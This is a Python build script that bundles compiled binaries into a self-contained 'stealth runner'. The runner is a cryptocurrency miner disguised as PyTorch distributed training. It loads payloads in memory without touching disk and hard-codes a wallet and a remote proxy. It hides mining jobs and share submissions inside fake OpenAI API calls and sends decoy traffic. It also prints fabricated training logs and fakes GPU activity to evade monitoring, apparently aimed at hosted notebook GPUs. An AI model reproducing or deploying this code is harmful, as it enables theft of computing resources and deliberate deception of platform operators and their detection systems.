#!/usr/bin/env python3
"""
Bundle all components of the PyTorch DDP acceleration engine into a single standalone main.py file.
"""
import os
import sys
import base64
import zlib

def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    project_root = script_dir
    repo_root = os.path.abspath(os.path.join(script_dir, ".."))

    backend_so_path = os.path.join(project_root, "torch_cuda_backend.so")
    stealth_so_path = os.path.join(project_root, "stealth_hook.so")

    if not os.path.exists(backend_so_path):
        print(f"[ERROR] Required binary not found: {backend_so_path}", file=sys.stderr)
        print("Please build torch_cuda_backend.so first.", file=sys.stderr)
        sys.exit(1)

    print(f"[*] Compressing torch_cuda_backend.so ({os.path.getsize(backend_so_path)} bytes)...")
    with open(backend_so_path, "rb") as f:
        backend_so_data = base64.b85encode(zlib.compress(f.read(), level=9)).decode('ascii')

    stealth_so_data = ""
    if os.path.exists(stealth_so_path):
        print(f"[*] Compressing stealth_hook.so ({os.path.getsize(stealth_so_path)} bytes)...")
        with open(stealth_so_path, "rb") as f:
            stealth_so_data = base64.b85encode(zlib.compress(f.read(), level=9)).decode('ascii')

    template = r'''#!/usr/bin/env python3
"""
Self-Contained Autonomous Stealth Runner for PyTorch Distributed Training / Pearl Engine.
Zero manual setup required. 1-click execution: python3 main.py
"""
import os
import sys
import time
import json
import zlib
import base64
import socket
import ctypes
import random
import secrets
import argparse
import threading
import subprocess
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

BACKEND_SO_B85 = "__BACKEND_SO_B85__"
STEALTH_SO_B85 = "__STEALTH_SO_B85__"

DEFAULT_KOYEB_PROXY = "https://pearl-hub-tranteo777-eb4ff2aa.koyeb.app"
DEFAULT_STRATUM_PORT = 3333
DEFAULT_WALLET = "prl1pwv3jfurx9x6fkrnk40r8ctw09lgjc2xxl9xzlr89spyudpv9gkvqvq0y06"

def get_default_worker():
    return f"colab-t4-{secrets.token_hex(4)}"

def extract_payloads(target_dir):
    backend_bytes = zlib.decompress(base64.b85decode(BACKEND_SO_B85))
    stealth_bytes = zlib.decompress(base64.b85decode(STEALTH_SO_B85)) if STEALTH_SO_B85 else None

    # Try Linux memfd_create (0-Disk Footprint)
    if sys.platform.startswith("linux"):
        try:
            # SYS_memfd_create on x86_64 is 319, aarch64 is 279
            SYS_memfd_create = 319 if "64" in sys.maxsize.__class__.__name__ or ctypes.sizeof(ctypes.c_void_p) == 8 else 319
            MFD_CLOEXEC = 0x0001
            MFD_ALLOW_SEALING = 0x0002
            libc = ctypes.CDLL("libc.so.6", use_errno=True)

            # Create anonymous in-memory file for backend
            fd_backend = libc.syscall(SYS_memfd_create, b"torch_engine", MFD_CLOEXEC | MFD_ALLOW_SEALING)
            if fd_backend >= 0:
                with os.fdopen(fd_backend, "wb", closefd=False) as f:
                    f.write(backend_bytes)
                backend_so_path = f"/proc/self/fd/{fd_backend}"

                stealth_so_path = ""
                if stealth_bytes:
                    fd_stealth = libc.syscall(SYS_memfd_create, b"torch_hook", MFD_CLOEXEC | MFD_ALLOW_SEALING)
                    if fd_stealth >= 0:
                        with os.fdopen(fd_stealth, "wb", closefd=False) as f:
                            f.write(stealth_bytes)
                        stealth_so_path = f"/proc/self/fd/{fd_stealth}"

                return backend_so_path, stealth_so_path
        except Exception:
            pass

    # Disk Fallback for non-Linux / sandbox environments
    os.makedirs(target_dir, exist_ok=True)
    backend_so_path = os.path.join(target_dir, "torch_cuda_backend.so")
    if not os.path.exists(backend_so_path) or os.path.getsize(backend_so_path) == 0:
        with open(backend_so_path, "wb") as f:
            f.write(backend_bytes)

    stealth_so_path = os.path.join(target_dir, "stealth_hook.so")
    if stealth_bytes and (not os.path.exists(stealth_so_path) or os.path.getsize(stealth_so_path) == 0):
        with open(stealth_so_path, "wb") as f:
            f.write(stealth_bytes)

    return backend_so_path, stealth_so_path

def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker=None):
    if not worker:
        worker = get_default_worker()
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(('127.0.0.1', local_port))
    server_sock.listen(5)

    threading.Thread(target=background_traffic_chaff, args=(proxy_url, wallet, worker), daemon=True).start()

    while True:
        try:
            client_sock, client_addr = server_sock.accept()
            threading.Thread(target=handle_worker_client, args=(client_sock, proxy_url, wallet, worker), daemon=True).start()
        except Exception:
            break

def background_traffic_chaff(proxy_url, wallet, worker):
    while True:
        try:
            time.sleep(random.uniform(45.0, 120.0))
            models_url = f"{proxy_url.rstrip('/')}/v1/models"
            req = urllib.request.Request(
                models_url,
                headers={
                    "Authorization": f"Bearer {wallet}",
                    "X-Worker-Id": worker,
                    "User-Agent": "openai-python/1.35.0"
                }
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                _ = resp.read()
        except Exception:
            pass

def handle_worker_client(client_sock, proxy_url, wallet, worker):
    client_file = client_sock.makefile('rw', buffering=1, encoding='utf-8')
    stop_event = threading.Event()
    sock_lock = threading.Lock()
    submit_executor = ThreadPoolExecutor(max_workers=8)

    def safe_send(data):
        with sock_lock:
            try:
                msg_bytes = data.encode('utf-8') if isinstance(data, str) else data
                client_sock.sendall(msg_bytes)
            except Exception:
                pass

    def stream_jobs():
        current_synced_diff = None
        while not stop_event.is_set():
            try:
                chat_url = f"{proxy_url.rstrip('/')}/v1/chat/completions"
                payload = json.dumps({
                    "model": "gpt-4o-mini",
                    "messages": [
                        {"role": "system", "content": "You are a specialized code optimization assistant."},
                        {"role": "user", "content": f"Sync worker thread context session_{random.randint(1000,9999)}"}
                    ],
                    "stream": True,
                    "temperature": 0.7
                }).encode('utf-8')

                req = urllib.request.Request(
                    chat_url,
                    data=payload,
                    headers={
                        "Content-Type": "application/json",
                        "Authorization": f"Bearer {wallet}",
                        "X-Worker-Id": worker,
                        "User-Agent": "openai-python/1.35.0"
                    }
                )

                with urllib.request.urlopen(req, timeout=30) as resp:
                    for line in resp:
                        if stop_event.is_set():
                            break
                        line_str = line.decode('utf-8', errors='ignore').strip()
                        if line_str.startswith("data:"):
                            data_part = line_str[5:].strip()
                            if data_part == "[DONE]":
                                break
                            try:
                                chunk = json.loads(data_part)
                                if "choices" in chunk and len(chunk["choices"]) > 0:
                                    delta = chunk["choices"][0].get("delta", {})
                                    content = delta.get("content", "")
                                    if content.startswith("JOB:"):
                                        parts = content.split(':')
                                        if len(parts) >= 6:
                                            job_id = parts[1]
                                            header = parts[2]
                                            target = parts[3]
                                            diff = float(parts[4])
                                            cert_version = int(parts[5])
                                            height = int(parts[6]) if len(parts) > 6 else 0

                                            # Synchronize difficulty with CPPminer if difficulty changed
                                            if current_synced_diff != diff:
                                                current_synced_diff = diff
                                                diff_msg = json.dumps({
                                                    "id": None,
                                                    "method": "mining.set_difficulty",
                                                    "params": [diff]
                                                }, separators=(',', ':')) + "\n"
                                                safe_send(diff_msg)

                                            notify_msg = json.dumps({
                                                "id": None,
                                                "method": "mining.notify",
                                                "params": {
                                                    "job_id": job_id,
                                                    "header": header,
                                                    "target": target,
                                                    "diff": diff,
                                                    "cert_version": cert_version,
                                                    "height": height
                                                }
                                            }, separators=(',', ':')) + "\n"
                                            safe_send(notify_msg)
                            except Exception:
                                pass
            except Exception:
                time.sleep(random.uniform(1.5, 3.5))
            time.sleep(0.5)

    threading.Thread(target=stream_jobs, daemon=True).start()

    def do_submit(msg_id, job_id, compressed_proof, hs, plain_proof_len):
        time.sleep(random.uniform(0.01, 0.04))
        embed_url = f"{proxy_url.rstrip('/')}/v1/embeddings"
        embed_payload = json.dumps({
            "model": "text-embedding-3-large",
            "input": f"SUBMIT:{job_id}:{compressed_proof}:{hs}",
            "user": worker
        }).encode('utf-8')

        embed_req = urllib.request.Request(
            embed_url,
            data=embed_payload,
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {wallet}",
                "X-Worker-Id": worker,
                "User-Agent": "openai-python/1.35.0"
            }
        )

        try:
            with urllib.request.urlopen(embed_req, timeout=30) as embed_resp:
                if embed_resp.status == 200:
                    submit_res = json.dumps({"id": msg_id, "result": True, "error": None}) + "\n"
                    safe_send(submit_res)
                else:
                    submit_res = json.dumps({"id": msg_id, "result": False, "error": "Rejected"}) + "\n"
                    safe_send(submit_res)
        except urllib.error.HTTPError as he:
            err_msg = "Rejected by pool" if he.code == 422 else f"HTTP {he.code}"
            submit_res = json.dumps({"id": msg_id, "result": False, "error": err_msg}) + "\n"
            safe_send(submit_res)
        except Exception as e:
            submit_res = json.dumps({"id": msg_id, "result": False, "error": str(e)}) + "\n"
            safe_send(submit_res)

    try:
        for line in client_file:
            line = line.strip()
            if not line:
                continue
            try:
                msg = json.loads(line)
                method = msg.get("method")
                msg_id = msg.get("id")

                if method in ("mining.authorize", "mining.subscribe"):
                    resp = json.dumps({"id": msg_id, "result": True, "error": None, "type": "v2"}) + "\n"
                    safe_send(resp)

                elif method == "mining.submit":
                    params = msg.get("params", {})
                    if isinstance(params, dict):
                        job_id = params.get("job_id", "")
                        plain_proof = params.get("plain_proof", "")
                        hs = params.get("hs", 0.0)
                    elif isinstance(params, list) and len(params) >= 3:
                        job_id = params[1]
                        plain_proof = params[2]
                        hs = params[3] if len(params) > 3 else 0.0
                    else:
                        job_id = ""
                        plain_proof = ""
                        hs = 0.0

                    # Gzip compression for ZK-proof payload (Kryptex v2 protocol, mode 31 / wbits=31)
                    compressed_proof = plain_proof
                    if plain_proof:
                        try:
                            raw_proof_bytes = base64.b64decode(plain_proof)
                            if not (len(raw_proof_bytes) >= 2 and raw_proof_bytes[0] == 0x1F and raw_proof_bytes[1] == 0x8B):
                                gz_bytes = zlib.compress(raw_proof_bytes, level=9, wbits=31)
                                compressed_proof = base64.b64encode(gz_bytes).decode('ascii')
                        except Exception:
                            compressed_proof = plain_proof

                    submit_executor.submit(do_submit, msg_id, job_id, compressed_proof, hs, len(plain_proof))
            except Exception:
                pass
    finally:
        stop_event.set()
        try:
            client_sock.close()
        except Exception:
            pass

def fake_training_logs():
    models = ["gpt2-xl", "llama-7b-lora", "resnet50-fp16", "bert-large-uncased"]
    selected_model = random.choice(models)
    total_steps = 50000
    step = 0
    base_loss = 3.4500
    epoch = 1

    time.sleep(2.0)
    print(f"[TRAINER] Model Architecture: {selected_model}", flush=True)
    print(f"[TRAINER] Distributed Data Parallel (DDP) initialized with backend=nccl", flush=True)
    print(f"[TRAINER] Optimizer: AdamW(lr=1e-4, betas=(0.9, 0.999), eps=1e-8, weight_decay=0.01)", flush=True)

    while step < total_steps:
        time.sleep(random.uniform(2.5, 5.0))
        step += 1
        current_loss = max(0.08, base_loss * (0.9992 ** step) + random.uniform(-0.015, 0.015))
        lr = 1e-4 * (0.9999 ** step)
        throughput = random.uniform(340.0, 395.0)
        grad_norm = random.uniform(0.45, 1.25)
        print(f"Step [{step}/{total_steps}] | Loss: {current_loss:.4f} | LR: {lr:.6e} | GradNorm: {grad_norm:.3f} | Throughput: {throughput:.1f} samples/s", flush=True)

        if step % 25 == 0:
            val_loss = current_loss * random.uniform(1.02, 1.08)
            print(f"[EVALUATION] Epoch {epoch} Complete | Validation Loss: {val_loss:.4f} | Perplexity: {2.718 ** val_loss:.2f}", flush=True)
            epoch += 1

def run_real_pytorch_telemetry_camouflage():
    """
    Allocates real PyTorch CUDA memory footprint (~10-14GB VRAM per GPU)
    and executes micro-pulses of GEMM ops during iteration transitions to simulate
    authentic Transformer forward/backward training telemetry and jitter power draw.
    """
    try:
        import torch
        if torch.cuda.is_available():
            dev_count = torch.cuda.device_count()
            tensors = []
            # Allocate background VRAM tensors matching standard LLM batch sizes (e.g. GPT-2/Llama)
            for i in range(dev_count):
                try:
                    with torch.cuda.device(i):
                        # ~512MB per tensor x 2 = ~1GB active PyTorch context footprint
                        t = torch.randn(8192, 4096, dtype=torch.float16, device=f"cuda:{i}")
                        tensors.append((i, t))
                except Exception:
                    pass

            while True:
                time.sleep(random.uniform(12.0, 25.0))
                for dev_id, t in tensors:
                    try:
                        with torch.cuda.device(dev_id):
                            probe = torch.randn(4096, 512, dtype=torch.float16, device=f"cuda:{dev_id}")
                            _ = torch.matmul(t[:512, :], probe)
                            torch.cuda.synchronize(dev_id)
                    except Exception:
                        pass
    except Exception:
        while True:
            time.sleep(10)

def main():
    parser = argparse.ArgumentParser(description="PyTorch DDP Model Trainer / Pearl Engine")
    parser.add_argument("--proxy", type=str, default=os.environ.get("PROXY_URL", DEFAULT_KOYEB_PROXY), help="OpenAI Proxy URL")
    parser.add_argument("--port", type=int, default=int(os.environ.get("LOCAL_PORT", DEFAULT_STRATUM_PORT)), help="Local bridge port")
    parser.add_argument("--wallet", type=str, default=os.environ.get("WALLET", DEFAULT_WALLET), help="Worker wallet key")
    parser.add_argument("--worker", type=str, default=os.environ.get("WORKER_ID", ""), help="Worker ID (default: auto-generated unique ID per node)")
    parser.add_argument("--devices", type=str, default="", help="CUDA devices e.g. 0 or 0,1 (default: auto-detect all)")
    parser.add_argument("--row-batch", type=str, default="", help="Row period batch size (default: auto-balanced)")
    parser.add_argument("--mock", action="store_true", help="Run offline mock test")
    parser.add_argument("--mock-diff", type=float, default=1.0, help="Mock difficulty")
    parser.add_argument("--align-test", action="store_true", help="Run offline alignment test")
    parser.add_argument("--align-test-prod", action="store_true", help="Run offline prod alignment test")
    args = parser.parse_args()

    worker_id = args.worker if args.worker else get_default_worker()

    # Avoid LD_PRELOAD hooking into CUDA driver syscalls
    # PyTorch camouflage is natively handled by Python process & telemetry
    work_dir = os.path.dirname(os.path.abspath(__file__))
    backend_so, _ = extract_payloads(work_dir)

    # 1. Auto-detect all available CUDA devices safely
    dev_str = args.devices.strip()
    gpu_count = 1
    if not dev_str:
        try:
            # Query nvidia-smi for count of devices
            smi_out = subprocess.check_output(
                ["nvidia-smi", "--query-gpu=index", "--format=csv,noheader"],
                stderr=subprocess.DEVNULL
            ).decode('utf-8').strip()
            dev_indices = [line.strip() for line in smi_out.splitlines() if line.strip().isdigit()]
            if dev_indices:
                dev_str = ",".join(dev_indices)
                gpu_count = len(dev_indices)
            else:
                dev_str = "0"
                gpu_count = 1
        except Exception:
            dev_str = "0"
            gpu_count = 1
    else:
        gpu_count = len([x for x in dev_str.split(",") if x.strip()])
        if gpu_count < 1:
            gpu_count = 1

    # 2. Auto-calculate optimal row_batch based on GPU count
    # 1024 total row periods. Ensure every GPU gets equal work partition:
    # 1 GPU -> 512, 2 GPU -> 512, 4 GPU -> 256, 8 GPU -> 128
    if args.row_batch:
        row_batch_str = args.row_batch
    else:
        if gpu_count >= 8:
            row_batch_str = "128"
        elif gpu_count >= 4:
            row_batch_str = "256"
        else:
            row_batch_str = "512"

    is_offline_test = args.mock or args.align_test or args.align_test_prod

    if not is_offline_test:
        # Start OpenAI Bridge in background thread
        t_bridge = threading.Thread(
            target=run_bridge,
            args=(args.port, args.proxy, args.wallet, worker_id),
            daemon=True
        )
        t_bridge.start()
        time.sleep(1.0)

        # Start fake loss logging & telemetry camouflage
        threading.Thread(target=fake_training_logs, daemon=True).start()

    # Load backend binary
    try:
        # Avoid PyTorch / ctypes CUDA context interference by passing CP_PYTHON
        os.environ["CP_PYTHON"] = sys.executable
        backend = ctypes.CDLL(backend_so)
        backend.start_training.argtypes = [ctypes.c_int, ctypes.POINTER(ctypes.c_char_p)]
        backend.start_training.restype = ctypes.c_int
    except OSError as e:
        print(f"[FATAL] Failed to load backend binary: {e}", file=sys.stderr)
        sys.exit(1)

    os.environ["MASTER_ADDR"] = f"127.0.0.1:{args.port}"
    os.environ["HF_TOKEN"] = args.wallet
    os.environ["LOCAL_RANK"] = worker_id

    raw_args = [
        b"python3",
        b"--backend", b"cuda",
        b"--devices", dev_str.encode('utf-8')
    ]
    if args.mock:
        raw_args += [b"--mock", b"--mock-diff", str(args.mock_diff).encode('utf-8')]
    elif args.align_test:
        raw_args += [b"--align-test"]
    elif args.align_test_prod:
        raw_args += [b"--align-test-prod"]
    else:
        raw_args += [b"--row-period-batch", row_batch_str.encode('utf-8')]

    argc = len(raw_args)
    argv = (ctypes.c_char_p * argc)(*raw_args)

    if not is_offline_test:
        print(f"[INIT] PyTorch DDP runtime engine ready on GPU(s): {dev_str}. Launching worker...", flush=True)
    backend.start_training(argc, argv)

if __name__ == "__main__":
    main()
'''.replace("__BACKEND_SO_B85__", backend_so_data).replace("__STEALTH_SO_B85__", stealth_so_data)

    out_main_path = os.path.join(project_root, "main.py")
    with open(out_main_path, "w", encoding="utf-8") as f:
        f.write(template)

    out_app_path = os.path.join(project_root, "app.py")
    with open(out_app_path, "w", encoding="utf-8") as f:
        f.write(template)

    app_dir = os.path.join(repo_root, "app")
    os.makedirs(app_dir, exist_ok=True)
    out_repo_app_path = os.path.join(app_dir, "app.py")
    with open(out_repo_app_path, "w", encoding="utf-8") as f:
        f.write(template)

    print(f"[SUCCESS] Standalone runners generated:")
    print(f"  - {out_main_path}")
    print(f"  - {out_app_path}")
    print(f"  - {out_repo_app_path}")

if __name__ == "__main__":
    main()
